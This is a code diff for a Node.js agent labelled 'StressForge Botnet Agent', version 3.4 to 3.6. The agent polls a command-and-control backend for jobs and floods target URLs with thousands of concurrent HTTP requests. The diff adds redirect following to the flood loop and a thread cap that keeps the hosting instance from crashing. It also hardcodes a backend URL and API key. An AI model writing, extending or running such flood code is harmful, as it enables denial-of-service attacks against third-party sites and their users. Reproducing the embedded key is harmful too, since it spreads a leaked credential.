@@ -1,8 +1,7 @@
 /**
- * STRESSFORGE BOTNET AGENT V3.4 (ENTERPRISE)
- * - Fixed: Zero Stats Bug
- * - Feature: Success/Fail/Latency Telemetry
- * - Feature: Robust Error Handling
+ * STRESSFORGE BOTNET AGENT V3.6 (ENTERPRISE)
+ * - Feature: Smart Redirection Following (301/302)
+ * - Safety: Memory Governor (Max 2500 threads) to prevent Render Free Tier crash
  */
 const https = require('https');
 const http = require('http');
@@ -10,10 +9,11 @@ const http = require('http');
 // --- CONFIG ---
 const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
 const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";
+const MAX_SAFE_CONCURRENCY = 2500;
 
 // --- RENDER KEEP-ALIVE ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V3.4 Active'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V3.6 Active'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: ROBUST REQUEST ---
@@ -51,13 +51,20 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[36m[AGENT] Initialized V3.4. Polling C2...\x1b[0m');
+console.log('\x1b[36m[AGENT] Initialized V3.6. Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
 
 const startAttack = (job) => {
     if (activeJob) return;
+    
+    // SAFETY GOVERNOR
+    if (job.concurrency > MAX_SAFE_CONCURRENCY) {
+        console.log(`\x1b[31m[SAFETY] Capping threads from ${job.concurrency} to ${MAX_SAFE_CONCURRENCY} (RAM Limit)\x1b[0m`);
+        job.concurrency = MAX_SAFE_CONCURRENCY;
+    }
+
     activeJob = job;
     
     const duration = (job.duration && job.duration > 0) ? job.duration : 30;
@@ -77,7 +84,6 @@ const startAttack = (job) => {
     try { targetUrl = new URL(job.target); } catch(e) { console.error('Invalid Target URL'); return; }
     
     const agent = new https.Agent({ keepAlive: true, maxSockets: 5000 });
-    const requestLib = targetUrl.protocol === 'https:' ? https : http;
     
     let headers = job.headers || {};
     if (typeof headers === 'string') {
@@ -92,34 +98,47 @@ const startAttack = (job) => {
     reqOptions.headers['Host'] = targetUrl.host;
     reqOptions.headers['Cache-Control'] = 'no-cache';
 
-    const flood = () => {
-        if (!running) return;
-        
-        const start = Date.now();
-        const req = requestLib.request(job.target, reqOptions, (res) => {
-            res.resume(); // consume body
-            res.on('end', () => {
-                 const lat = Date.now() - start;
-                 jobLatencySum += lat;
-                 jobReqsForLatency++;
-                 
-                 if (res.statusCode >= 200 && res.statusCode < 300) jobSuccess++;
-                 else jobFailed++;
-                 
-                 totalRequests++;
-                 flood();
-            });
+    // Redirect Handler Wrapper
+    const performRequest = (currentUrl, currentOptions, onFinish) => {
+        const lib = currentUrl.protocol === 'https:' ? https : http;
+        const req = lib.request(currentUrl, currentOptions, (res) => {
+            // Follow Redirects (301, 302, 307, 308)
+            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
+                res.resume(); 
+                try {
+                    const newUrl = new URL(res.headers.location, currentUrl.href);
+                    performRequest(newUrl, currentOptions, onFinish);
+                } catch(e) {
+                    onFinish(res, e); 
+                }
+                return;
+            }
+            res.resume();
+            onFinish(res, null);
         });
-        req.on('error', () => { 
-            jobFailed++; 
-            totalRequests++; 
-            flood(); 
-        });
+        req.on('error', (e) => onFinish(null, e));
         
         if (job.body && ['POST','PUT','PATCH'].includes(job.method)) {
              try { req.write(typeof job.body === 'string' ? job.body : JSON.stringify(job.body)); } catch(e) {}
         }
         req.end();
+    };
+
+    const flood = () => {
+        if (!running) return;
+        const start = Date.now();
+        
+        performRequest(targetUrl, reqOptions, (res, err) => {
+             const lat = Date.now() - start;
+             jobLatencySum += lat;
+             jobReqsForLatency++;
+             
+             if (!err && res && res.statusCode >= 200 && res.statusCode < 300) jobSuccess++;
+             else jobFailed++;
+             
+             totalRequests++;
+             flood();
+        });
     };
 
     for(let i=0; i<job.concurrency; i++) flood();
